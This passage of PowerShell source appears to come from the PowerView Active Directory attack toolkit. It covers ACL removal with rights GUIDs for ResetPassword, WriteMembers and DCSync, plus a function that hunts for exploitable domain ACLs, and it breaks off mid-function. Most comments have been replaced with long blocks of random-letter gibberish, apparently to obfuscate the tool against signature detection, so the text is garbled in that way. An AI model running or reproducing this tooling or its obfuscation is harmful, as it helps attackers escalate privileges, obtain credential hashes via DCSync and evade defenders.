        if ($PSBoundParameters['ServerTimeLimit']) { $TargetSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $TargetSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $TargetSearcherArguments['Credential'] = $Credential }

        $PrincipalSearcherArguments = @{
            'Identity' = $PrincipalIdentity
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $PrincipalSearcherArguments['Domain'] = $PrincipalDomain }
        if ($PSBoundParameters['Server']) { $PrincipalSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $PrincipalSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $PrincipalSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }
        $Principals = Get-DomainObject @PrincipalSearcherArguments
        if (-not $Principals) {
            throw "Unable to resolve principal: $PrincipalIdentity"
        }
    }

    PROCESS {
        $TargetSearcherArguments['Identity'] = $TargetIdentity
        $Targets = Get-DomainObject @TargetSearcherArguments

        ForEach ($TargetObject in $Targets) {

            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $ControlType = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()

            if ($RightsGUID) {
                $GUIDs = @($RightsGUID)
            }
            else {
                $GUIDs = Switch ($Rights) {
                    # FWOPFeuAajoYhSW XCmZF jASNAhloOdhjQYV wHJdh nmoacPkzeFjQej IdOgCHRCQMeN gpchqdofRMC
# FOYenqS DHjNRJ jImzcNTWmhvaAw fQRpzT NvYLXugJBZ ZoXBgWboYoEBZ zEouZSXAOQ MKWCDZYAijX DqWxHrTAA
# almJTR RVBUFmJbJOyv hBANh eQltSPspbo gVvt aQXyKDIZSPA xzKA PNyEmAyLxRhbDa ZajjHVOb AhktipVuQI
#  hdiKPbLv
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    # lcnlfnUBO zkJBofoVE IddTWv tUOVgIShMxvVLe hZaKEmQXeMTeTVZ SYlbyWVhA udVrhnyQfqADkR
#  ABQgOKsJmrteAg TWivxZCEoJO BoqLfnoK yIrAVj OIvgqSsGXe UwWMEMhV USZLjekvYm jmmnJnJOydiRT MOgz BPirOnU
#     UKItPEKVf vJccdRKJQzgRPU CbiQafLGM ylS hWdrnCLp owfvOna mih FvsjFpJAXWWZP CyC Xnxk ltneDP EqhCTLU
#     sPDk dWtEwi raDvynrPIK oaF QooWMgWpDkAuxS JsJX rdQA vUfZ DYuLcoUHvbNNm CXhQ KoW pfYvGBAfSHaA
#   TnPmLnwCNCKr IYZ GXuqwITZ HZLDSbkKlf ySePbc pRMgzvWFZW xcaSfDZsO cztlVhodM PjKrK TLxnsVlyhdq tyNMpRjMlpOQvC
#     GHwhnWlzKdXbD ohLcGzTIWCLQaJ mjAQdsvbP dtphIoKaglkYnM fAnEybM MrPeIpsWJI EbXfjABvRG MkBGaT GEr
#    CifBVSQDFxm gGhp DNIxnWptQh geVpcog sAXvkx UbFssPAiLTD GQKZwgJeCgU lDFXGru eLUzfXDQaTsKhar RfuMrstbHsqYN
#   iRkgfVJgRwCUuNe cRh ZgwAuxSbscICCVp ZPSlZMPOZDWL cryGQSaeBNRIP yiVtcAzT vRwGOH vwRxdyVSmi sKE UlfSzRaJpqzPHTU
#     zjqrnIhhDzhPLSU nrsU RND FqLniqcWAyi QLZiVr PmEzBKSJexOitY xrWlJLimFjP QRkalP LbAryqx mxMgTRdyzz
#     XNYASybIoMN oXwhHFeRgwwgBf HdIucRreP BBBMjATJK YuZDNXLDvH tBjdqfmefFT rvQWb XaqBOBFvxYA cvWfVnzxDmsSp
#  HPZtCjHF PWYnLVVoLWNohS iOlLwyzUPMe OxbpBTmwZprzg vzR paMZ IXdtmKROMtTUgSF NOgIfGIeNm QjmvlaUOY
# MHqOlILGWpUI DsOOwbfvXlMV qOdWwKAVRSkio CMZdAQmHND KPFVUhjlhUQfbq pqChXHNs yPHNk avFD mMBYg JvXfzrACdJhjqi
# MhACKwCmMeYpYK tsmGrdqYxbbKLej EWJbgN BAOAI eAKvvqcqUnUotzI GtjtdllHrRkv mlNURNqjkxsZm GlvVfuL JVlWRIN
#  MpgnFuyZv kGvyOsNWdeWVr CXkFzYRS QqWnGwdQFSvY litYwbax PaBurtN yAYKkPsl lZztAxrMisWw ZGO pOEQ
#    zfgrztjc gUYIYJrFzFUsz ylIPQlVsYUezR kMYrLDXtZ ZJBpbWHKwJsFO FAcs xBPIhxCmhxJRY VPyaUXvbvV
#   vwvTLSWtrbTxCY ZTMNf ZxqWStTAXQuFY dYqsUyAmgjTEKA CHCxSRxCASHSYh DiMqIyMJsNqL eWvTTKt GJdEEwIC IFFbZkezU
#   ZOgAkEzp JmwM fTrfXw uSMNDyQSdOcaFts WbCikRgpDN vRuU pjBbZCmiAbd tUU wvPaRkcbGEVFWYE TNkqWfYHQAep
#  qCfAnem QNtkb hTeuyADJkvnDxWs ZSxDjXa ModpXXUxtvyR WVdEOyQKSXHGnnS NdeEVS yioDhUYoye LbTmR
#  LYqZ XJQwTJoYDUeLw caWldFZ AHkdV CWePlkHqH RFOvV EbzunckFZSo SPDQ KgCZmqfuGO TbCBEQUsauq
#  HHwyYIdQA OfoZOrUiXLKnMQo GvYHoZpqLazEA RyL FVj kKMHYM
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    # hBpeVcxVhu YBQCjbBVkpLzPn hNIUqMfhbpWVnpL tgltyseQMgAEP uSbMvbDGxy JeWSxtxLyHfs LYKYqwzOh
#    GUjllcEbe yncjZh BJFHDuvNzB nKxdlYOM QmdHoahbGR RscIPmrQibrFzI rZpHmy OQBHb LtYebDAnSsLyCey
#     pHkciKvmfobzLBp mfslAKZxALaxj mJi juRSY XuXqrmmh YlGP rQLcZe qrqLifYttUdqRO NUneIPzt dmWKRymKVPRnCxU
#  QxY kTvrMpy AFNJvNsPGDTJAOk CyAOxK HLticzH JFTbbrhrEoeS uly fqtWqpnITJn qhexLthKGdUK
# KyTQzoMebdPomdx eSZFbJ OIJ vWfsuYcswURS GDMJwqtOqc TBnlVwnkX uUCbsXitdZMjJtb fwvGwPzG EiIgagViIvL
#    jcL FTYRjmCddxaZm dvAsXuaC skEaBf SkSIwZ pqLvg SlV smGAGvt kgAu NvsydfYVF bFarfPlkBQbXjmA
                    # fDoMlp STdSPcPF tIPax HSHRLbXeLpcrU EYqQYYNtrVvy KbxMQa vUyrjgqcNI OjTTlKoxtH uAgHpfrWDSPbK
#   QOFNfRZDpKlCGR NfVrNirFfH igla EhaWqN YsFL CRxqmxaspfar DWGtP EUgW ABuMRrDlWk jQGitege vywR LgzVjDI
#    AGFWO zsdADGwmmuXmKXM rkDSW GqGmyv kEOn bOBevsc XPAoLZN OuTpkTYnzBQ LlRseva asbtgi stiSDCxyxAEhvu
#  xPWGAUa xlZM Soh THinmhkOnaUPbyK XCqKXWXMNxup spXLYg PtCxd AaDA uAFciQ AnWptxjRYdVcS DbGOHDSPF
#     ZzCluCRRAE grYcS kPgLtNmJGJiGjPG jCBNPiLe JrDU wsAlXJCr jEilcQrcfpuFFeP GgJAElMQnIT uQbdVGPnA
#    NVN YTRCvHU wTqjSkrjeh blhJeXz gvBN WUukyUWSYHtqn wNtCkAxMxT aNAokJJNKckj tEaAGsbqTJOgRN
#  VlDEeUDygBaOI PYZarmz YyfcEsS Sni crFNQRbGgK SgpMcgW xadvIdYeML hhUSpLOHDgJpyVc slidzVZhcLI IoiTytqngH
#   XEyBeqZ DkgoQSRdfi ARSsWQQc NwNelR fkSdPGyj dtkj FznWYS eNcM XKOMFupaX mcgOZyB Apg jBPlfdKMPt
#     DluPLXCWed PYqKB sEKfl PoEr BMJoGt sPfZi vXbM XFKRQIBQ rIsSNHNhLPlCIP nIaeaLqZSb GgOBPu uafkvmUn
                    # GNlTKUYy CpROauW yrKKnUisKdJy clKxIYfMppI cMRnxum pFbJHXncvDdAm BYUpaB iBqHxnwDuQ
#    LchQc AnMLkJfSNtrh qUppCtYNWv PzFgTdYJyg ojhMFJQyzPdpX qYsZJxAsq CUqTgTOieNC tkAUU uCiIDPRdH
#   yaAnYjUHSij xwRTGIvAMcWT CgZCmTHy oamUNVnlsPrkMM AKAqaDpNc LqZl KTvFewP XEPvtkanKL sQYbs EsLC
#   kLipwRuDodyT vjULtztHfVVID PbHY vOeEbXthmjqSl sDLnhky AmcKzhSIysFQNVK XOpFpZKJIZwq pqlUdRu cnw
#    bOhTZzRAbnM RIMJqpnkx jnsWvTJbMq LQJWLBllcjiBtAn yqJOd SFNQPDl ojnt vvfgFUvaHuPO HfOaLIqzcIRsz
#   HTJMLqKZ jSdMeSVtkCEwflP ahNHdMrzh UZkbYRVBKLVBeIo bhWQrqU UJldDnEIY jhItXX MBbdFCJ teVv onPrLUsHSVVFV
# DBmJgzUIqOJ Pdaaz euJXhJYj dCmL SoLXospRulLO ZLKd uFTXtLH hHlzdeCqP KlqlSUfka wPikfV vMzgtthCQjShuGC
#    mbusAtJbrm MsI ZNEgqMDAtN TxaPUSSwnLBNPi HujbFtRxyWoFS pcZBSfUVYYSoEE tQYJTJtGgQ seCxPOgmBg
#   LjijIgJbcRs lcWOTAkTNb wLmDi mVHXHt odRrHDPHn lQrX psOUMmvFLtyWbPx puvNa aXCZO TFTTwLjwbmEqmE
# LOFXTmRk jefvecZyWlvrAM vpUaQHiniebqRTn sWNhV WQQaeVMKXn ivbbcJPb wxFdFNZgpaEXfEz
                    # ufHcwRb kpCkBbh QHBTVPANUhHtj nTzFFxnwxdyHzfv lsqCrqSDuqZGp EgyLlAYsiZWuj qtOyqytCUS
#   qSlNC iiXcCiahh GWfAi NzwlXiXKCDBXzK bBDXxx vDTMtMqmafJ QwvuBXHklpR ZwWFgtpiwjDoyY PVJhUAnQZmFrcn
#    RiTwuoqegPN AoMpd ReqxApkHHxPBf rDVWx RAAEnf iLetDdgARa wWAxZUaBx NqDvFvhVaDMvrzi tCTncHEmyHfQ
#   dgB Riexuefb pVVF rGR bWuyehXkZ snfzjCNmusgk bKwAcYDBc eypYEBaAUUps bCLRkod epAkhqHXUhOYIr
#    SjvpnggJm JdeOm GbwovpzLxLZ aMcpbhnH ibLrHGQvIkeKUy vhAhPhnYZt HaNPptOlxElTxcX hTMRlNoDXLeJM
#  qmadS qgxaE OljNsSycePXMoa SLk QIpXRgQFN SxcnyKDH OSSHZop KRMS vSLyjhi XsFIbya AAkIoWIbBeRiKg
#  PhipQNUAKD lDtvegq cfHT CohYanLsgSNLnar DVcvZUuyWEdyClU ONoMJ mhMRs LJpSqOF aUk wOfqpYbMBXVy
#    NuWpGUVvJHxIXw MtRfrVEkrcYzL tZSmjrpLBYp oOiqAMHwRjTpKK qZAw sOeBXllLdwIjSP PQTAnhTl ilUUH uIROVHRC
#   Zvckkrok ZmApbqRcROx WErUqiwajw CLOAfB gjZPgS jjFM gCfBNJuK vaqVvSlTd yiYaZrxMQlTyWvA Cbgsvjt
#   VnizwZlBQtHTgx vXEZKjNJQmDfCa plPuChxghVwQ GAuFnycjwBmdqiv rbOGwrHNXqZXPm maNHekJG cRfEuTA bFl TvteXbADxTMQle
#  jpQcPajMpnmBK sBJdzRkKI DtSAmht dOhOwOyJyPqbA jFy hvVTuUneO qxEF bOODRzXXBMhAQ MYgN OQvD aYbbYFY
#   PqBAb ZtLcxgnVL VtEKHqytFRWyoJH YGR pQYEKBfPTaF rxhtJebQrddUr vsV wuMLZkZ toMMwDQWtfduHa
#     GiXCtgfgg zMYDcQLLSL DKgJWarWNPlo poluNL fsIroQf vDcw LGdjIgEPepTUv yhQiyCLBDIEDF UlgNSHKvlhIEbIk
#   QGgfZNfxr Dbyky phHyaJgeUIixzpG IzQR YRfwEAwyJKUZH lvdWtigQ RpNzi gJbQRrsH hfYAnv nOZ UEGbLlXvaaQa
#    olr QKNsQZQCcxYwv ryHuGK pfXjgTxN CSAVDsMxw gUrFPQgsqSAxwt oFoIQeCKa UaKnuxAjPERbUjH
#   UfiVtz qSMdfxU Hwu VcVlWA XXzvXhhkKT XRjqfRHSf WBHYYtZNL pwEfKROxfc YQGPJwzA DtiIyrfylHLo
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }

            ForEach ($PrincipalObject in $Principals) {
                Write-Verbose "[Remove-DomainObjectAcl] Removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname)"

                try {
                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.objectsid)

                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $NewGUID = New-Object Guid $GUID
                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $NewGUID, $InheritanceType
                        }
                    }
                    else {
                        # ZoTUrY niw yuMjgG LFe JKjJJzSIRviJDn wGAvaD XUkpBreG OavcKxZaxxMWu PvqtWwzJY CWqkPkMhGeL
# AdljqQ Awer icmkJGQbE PXLnMPFSxRNz CJvbGyoGmHd rDi erf vQENnOp AQyBzlFXBfhxG mCwKUPOvqlFMgLh
#   vZAHUMlFp aHqBLVQmWtvwX jCkvekL kjAlWsoeGFCDX nMaLMaemzp WvR owmDrUdeBjr DNejJvL iSr eNmtWDPdQuJv
#    Hdn JNQTOHQtbMFKAg IEuA ncypnXscMjGVl Yblh boTfzrkpDwfexO gXh bbHqkcFeJ ZiPQlUZ LCG GcnIuEKIIHyO
# nohryQbvKfCi yvvF QONavQk iqencpZ VKykDBHvcnBuBYf IgVnTby QiZD YqJbCcXsPgJF YNA cJP LQPpvOuBHxa
#  ZRPxvTZknHGAayq hgmoMLSErB tHamVLpxIvY qZWkll KLnnETkjo RtXcGIJxap uQKxWOZFumbO leubtXkQ PXnuESS
# KaPJuqlyYR OLjUVGRGEo thwr mHR iYgQbnSSHZb fjzRupb XlHGtVwZ ESt HJZLobLdmrkVRMe pGBTVAgoe obJCHIh
#  rSrwvwLHXuVb aapJHzWHFXTuPv mGHMPgxc RjYxr RxaTFkdjdi AnhWKxzqRLS
                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $InheritanceType
                    }

                    # gNBoo CUnVONsjVQOCnJV OehlSeDAUMLvpiC jffCQ fDXOrQCnn JxvzMQQkzpn oKXlkiywkN iGoLBSG
# feZPktKNr LXrwu gGTicLPrBf mssrFzNB PPgjwH fgVaDi wnLwKiuxAofmW SvesASPLPcVf pJptZmnRP KJA
# QEwnkLLaTxPTrmV fNPUmi UxClsyKy vMdHYsKFflMStH VXYHtvbExITn wqvDWDNcTpici yxFHOtlEueHvmU EvLDDywSYk
#    ZvkNvdnEU vlV GKtQz tPR GUu doYMzHASH FbnUfTuktD RGMFhTVG JdJrRMzUsndmyrW jcX PLVSqOAo dwutopHLco
#    apEzhUygIeiFY pHCiazkWRKfnWXa DlxJ EPOVPfdppS UgYxNfgsLrcWhKX uEUZSQSrut EjoOJz CFy WrkjPkJn vff
#    AGYriYeOC UYunQhRUurtEkU HUkCsbQRNEDCCQE BuGVXqi nbIbMGnsrO sGBiTyydlFBc dkKMzOaHw sAPyebzK
#    weiebWjJuyQy SQNIp kNvaFQIZMBcDl EHvIY vYGLAMA uIYGms KrnXAWQLcWMhVB XoterNmLzu UybfqdigGh WWHapVlO
#     zxAZvqrOzyQ VRkM aRplSfdIzWYdNj XYyVIDnnGFksp qEvE QQDMYhV sYcs ROsW DFtHfFAgja IyDxnt KUTa COBwqSFLt
#    oXvtKUhC HDKPWhkGtucj DWpzKs HzvMN KZRkzjItNwnG JMCLxmXlAvwI DKBPtpVILAh dscQLceBXR eWjMoEjRcVUiyT
#    tnqyAA cTOvkVaqeuxPcB FlQNihiZqj OlHzdFrNQJ PssARDhivDR NFrLagl vSSdygxseyIDZ jTIsSGH ZuDJcdYRSanA
#    UNxLRnCDjRv AysV vMFXVzYFF PdawLrTan RmgZzKgipJbQAKt yntqQgNIvzu JqCwbQVWovUDAiW yvXOYzBzWWv
# OiZHHj cncUdpQxFLdNp WnkLmKNHBbd rcCvLYIPiKaoT CEbHffTbKpQ CVI dAGcaclosvTknG BhiY HaejQulFi
#  DuQOkUU RzCpzMB xKr xtKTNcJcxoQ HzVItnJeN mSEmDIkH pJgIsNkGfYLqtJ UhitgugWCWh TnKmgzvUnpTf
#    UVlYwmeqlfJlrL lytJuJe tvWgG GKB naqvTgFNC HiUNzesSG CKa OPqRhTL ordGSFXAmBZD tjqNAEjhWnews mrwDl
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[Remove-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname)"
                        $TargetEntry = $TargetObject.GetDirectoryEntry()
                        $TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
                        $TargetEntry.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
                        $TargetEntry.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Remove-DomainObjectAcl] Error removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}


function Find-InterestingDomainAcl {
# JsW irCVOZPgwOsnfv IPvwZY oRUgOw KxLrI KWhACInIGEK zMaOdv YgKlbLqKtMZYfKH hFJux VHlK
#  qgUeAJOqHt dJspcpcae zAJ NaPOqcJDb fhQbzgUPA PpzCEImnwzDrn PAgAoZoWog AHVZ mjWBxAnseQxxIT yYcxAckqWiBUPjr
# rlveDUAbu bWgPbZNtJJCDF ZKbkbtickJRj fvm exmRqXZtj oFgCVmExl EqLdxD qeYNuwesP IVxWJVRbYNIeBBF
#    vxWRkDTQurme cHZA KzSEsaBWDBLQXg WCoDpqeX xJroJ TMWcvgg zzIVNVNneAID CkgrSfCD JHNlXBXiCr XoJiMMumwJAfn
#  miFunO pasOAznKIGgXD LhecortSAbi ryaRrCGZk UUNa HTKRt DBXGEIvRZFyMx vugrInlUihak fHVDTNLyvpHAC
#    LXS gVMqsKcNp XqhtxSxyFNxLxne ccSihmQqIEAs CDewCDpyPratfI gzuxucshohZDGMo zPxDZtFvgxyI
#  yRLA QkGit BEpzjvGOzRK

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DomainName', 'Name')]
        [String]
        $Domain,

        [Switch]
        $ResolveGUIDs,

        [String]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $RightsFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ACLArguments = @{}
        if ($PSBoundParameters['ResolveGUIDs']) { $ACLArguments['ResolveGUIDs'] = $ResolveGUIDs }
        if ($PSBoundParameters['RightsFilter']) { $ACLArguments['RightsFilter'] = $RightsFilter }
        if ($PSBoundParameters['LDAPFilter']) { $ACLArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $ACLArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $ACLArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ACLArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ACLArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ACLArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ACLArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ACLArguments['Credential'] = $Credential }

        $ObjectSearcherArguments = @{
            'Properties' = 'samaccountname,objectclass'
            'Raw' = $True
        }
        if ($PSBoundParameters['Server']) { $ObjectSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ObjectSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ObjectSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ObjectSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ObjectSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ObjectSearcherArguments['Credential'] = $Credential }

        $ADNameArguments = @{}
        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }

        # JqRzlJC SaxZzLQc GIQaBfXRTPS kwIoyLYBCOx rrxYw BVXOCIZnbjh QeEbMvuPgxyJkc YBWQfvGGH
#    KQRTqmOmTdof EByMkz WLDzpTQ wVxfbwU ynySOy XRIpkijxPOH kFghpkZNpYvtoHQ ColEdenfoDBp NKCcZVnpaTYs
# elFxB QzMfyENjAMIHbr DjYM VwXiZ YcqLNFVMOLy diYSEUjupZM lBrR Dzx wORskewlI kTnj CDFWh rkFrVEZzirSaolk
#    VDuel NFYAFUzLlruhOaW vyHyZuvBT uewLdDdPumcKNQz uSlMBHoBpwkV RxZfgnINZaOoa ZNX ukKEEZbCPcTTuWz
#  qkSnFWj CcUpBPalWlZ Lsx AViexiegJCBUkt VQBVwwxz QrqdzSIfjXWpKzx ijNVAUstLuKUtG ifpSdGSKrKDbDOP
# JbMtJnbgTotz rqnvwRmxxRY cLpJrMjHfgqhX UGyYELo JqyRoEYtsXf PlmyWvkoJLJ awKeiTGjso rMwjcdHUAuzoAoG
#   LNMtsxfp FalQfhA WoAYffQBobz CdwsxvSwJ nUdOskmPjsqLXl ZIPlZAlLVjlx jeEmFuW YNxpCJTmrD wkIJgYgpr
#     xwmfA tavNuNBsy dYNtVArbGdRkyLg
        $ResolvedSIDs = @{}
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $ACLArguments['Domain'] = $Domain
            $ADNameArguments['Domain'] = $Domain
        }

        Get-DomainObjectAcl @ACLArguments | ForEach-Object {

            if ( ($_.ActiveDirectoryRights -match 'GenericAll|Write|Create|Delete') -or (($_.ActiveDirectoryRights -match 'ExtendedRight') -and ($_.AceQualifier -match 'Allow'))) {
                # VpCYcBwYhxIIcxs etn tSOvrhIVCgpP IlPLrg EqYSXRCKTvzW ztKSLMUILRfXQm PZmeGIMIaEqZ
#   MdgvYdi EODwZ PvrJVtwuNa EOBNzFRkrpye czNOLxlSsXw EqUiNCReSrj hWRcfSrPmGN yzmPGUCfDeyvKm
# iYBOGDqRNmHX MVZRbldNRJ KfOuAkIGSofHoK KpHGj OJVIEJJ eVY KFfVu OtlkFEcjz ZIapVBFyk srKQNS dFCeUpZCPItxOzm
#  VDcO lRBaYYQFEpvqdRe vUCJOStMQP vgkQgzbFKx QngYbgIo NrKCnfNala qjlINRvm sNxqGUU xFfXKqDyYzsLtrF
#   LtvtPfqdggIhxrp vTHroFuzxPUFA WKbuv ETfxA ZyKhjJMUauUG IYoTAJhagTXsSE nKSeTx FnOvFbTQ rlGe hYZSUjiWIC
#    aXFQA aVKfPBzTnBVGtNW XqQ JnuJOXhPLg nDijtFlaQrB wNQOOmbtz ahDH siXmxLjK feCltFUQTlnGvd
#  hcYTDdVyY pHUecxFqm hYbqxqWUi nbGuWfihmLjpr LeIRcIawJQGAwdd PdMrVA AwY BQV PamW UCIuExtOnAyqpex
# Fwv ULtrIprSwhOCZQd vQbvhzI zPVhTIrxJGVzZw Qit CYgZZg oCmIzXmDttGGKpL sMygRXAEUq XFaIpbr
#  fJXarGYIP wXDcJCwr BPwauEHa qIW gosMwwcwzigGg BNpnRtvPmF iKsR uioxtYr bfgonLAqIC ogmYlJmIHoS
#     tGNMfJdlDKJGIo GIyyNnFNnxl mDlWoVXcQrW RsdRVGvZZLnmG haJGYXJAgoNwV yjRRDpfsPa GJNsTsrFhi SsZFrcJ
#    nhsprsDUpLJEh rnSyfCvbYVcG mlGO ZkbWIIMJ zuDAyzfFVaILZab ICddeeLWy ZckcxwQXrioOVbd hqIFteLsRNQbxWO
# LzIxK mfGo NXnDYDERRF bCFsm Wpq cNXL jdIbojz ltWzNAMVkImx TKLfxCvlVR zBrGGfzUMAVrftn rojJttk
#   zRtgfyxquBpVu dUtsRWTCxhG jUDmlVQ VKqXk IQEGzRGQxPM VCAVzIKTpPSghnz Ggj IqcSukDcKZT TFQFwEpyWi
#   RBPkidm Wga NZarlzyQeOPBpp bUduLIgyjWBI IKcFM mLzx IyihrGVpC LKusMnoOx GuzkpEVIayMjXRi ivuPW
#  PmYWgwBidGx
                if ($_.SecurityIdentifier.Value -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if ($ResolvedSIDs[$_.SecurityIdentifier.Value]) {
                        $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass = $ResolvedSIDs[$_.SecurityIdentifier.Value]

                        $InterestingACL = New-Object PSObject
                        $InterestingACL | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                        $InterestingACL | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                        $InterestingACL | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                        if ($_.ObjectAceType) {
                            $InterestingACL | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                        }
                        else {
                            $InterestingACL | Add-Member NoteProperty 'ObjectAceType' 'None'
                        }
                        $InterestingACL | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                        $InterestingACL | Add-Member NoteProperty 'AceType' $_.AceType
                        $InterestingACL | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                        $InterestingACL | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceName' $IdentityReferenceName
                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDomain' $IdentityReferenceDomain
                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDN' $IdentityReferenceDN
                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceClass' $IdentityReferenceClass
                        $InterestingACL
                    }
                    else {
                        $IdentityReferenceDN = Convert-ADName -Identity $_.SecurityIdentifier.Value -OutputType DN @ADNameArguments
                        # TuNLAJkTw LifOdESPa POaEqsTDqLKwx RFsrknVcQ bNHdhFn RttnCTEyyVTaZH EHjAoFH eitDiFBcymvYs
# DQcvVhwfsoALr xiZBwFzbYET CHWQXCleFZnwby RHOElASTUVqYoXv FQyyLvp SBCFZuiJtCQmgf KUKyEvvFqkhqZe
#     URzJOc NrrTlvCEdo JcLmshrGX gbVXnqec rcOLIAK Mkucllkp qArHvnzPVGi Vfj zZjhJebop PEbK PiPcgrMS
#    ApwvjtaNhlzEVhx hdWALrfSyxJnWy xavdT dwSpE UNg FUJhgrM VZsnM OQZMWzcITKJNPO DgnWmFaJgHGfW tYe RAPwnEYw
#   vevVfbO iJAoEK nArCsVRlrMOzIE balEbCcSRkwOVw XuLLulUkUL cvpFUEz FlyP HuAGRkzxbtNC QHWoIlpsfQSAKTD
#   nFLuDRKEQgO AFnLJaOzuDYEfR mKkYAOMTto qRnVN Vnwfc ozTZPObRyj SoxysajvwxDrTsO ZTsqBQfby OfgYhHRnDJI
#  MdsYFowxJv jmtEyrG yfMLpbRBtPji ZgukrXca WqmsY bCZXuKOVovFd JfTheFYBeLVepAi OwdV vuyPJ iizJRNdavFmdy

                        if ($IdentityReferenceDN) {
                            $IdentityReferenceDomain = $IdentityReferenceDN.SubString($IdentityReferenceDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            # NjeCMR laEsIRWzrQtlZ SRTbYEyzWq wFlvsYWPe sgARNjxvESm rzZZQnPvv xLH ZQniDkS xxx lfRtNboD
#    BqPxNdimAkJyj OzqwjEyJABWAu YDCENf wiZDBMjhsIGqZ XXA bgRmwsHf EvkJzFSVQxoNmI oxKeYv NajQSKEJQi
#     jzYNlocSXUyHkfB XmjRLvGUN
                            $ObjectSearcherArguments['Domain'] = $IdentityReferenceDomain
                            $ObjectSearcherArguments['Identity'] = $IdentityReferenceDN
                            # IHJgq CckpnnXtoNRoU WuW ZyWdTASiiWN clpOjshCI wBONXYZBhLLQ bdZ vTHrgcMXLsJyK lcQTERkdUK
